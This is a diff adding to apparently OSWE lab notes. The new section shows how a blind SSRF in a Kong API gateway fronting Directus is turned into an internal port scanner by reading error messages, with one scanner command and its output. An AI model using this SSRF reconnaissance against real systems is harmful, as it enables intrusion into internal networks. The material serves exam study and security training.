@@ -283,3 +283,40 @@ This confirms that SSRF request reached Directus on port `8055` as it returned H
 
 We can easily verify that TCP port `8055` is **closed externally on the Kong API Gateway server**. We are likely dealing with two or more servers in this scenario.
 #### Port Scanning via Blind SSRF
+we can still use the different HTTP response codes and error messages to determine if we've requested a valid resource. We can use this information to write a script that will exploit the SSRF vulnerability and act as a port scanner.
+
+Rather than exhaustively scanning all 65,535 ports, we optimize SSRF-based port scanning by focusing on a small set of common ports to speedup the proccess.
+
+A Python script was written: [ssrf_port_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_port_scanner.py)
+
+`"You don't have permission"` → Port OPEN (valid resource)
+`"ECONNREFUSED"` → Port CLOSED
+
+Output:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5                             
+22      CLOSED
+80      CLOSED
+443     CLOSED
+1433    CLOSED
+1521    CLOSED
+3306    CLOSED
+3389    CLOSED
+5000    CLOSED
+5432    CLOSED
+5900    CLOSED
+6379    CLOSED
+8000    CLOSED
+8001    CLOSED
+8055    OPEN (permission error indicates resource exists)
+8080    CLOSED
+8443    CLOSED
+9000    CLOSED
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+```
+The scan results are not inspiring. We only scanned a handful of ports, but only port 8055 is open, which the web service is running on. The common services for connecting to a server, such as SSH and RDP, are either not present or not running on their normal ports. There are no common database ports open either. We are likely communicating with a microservice running in a container.
+
+#### Subnet Scanning with SSRF
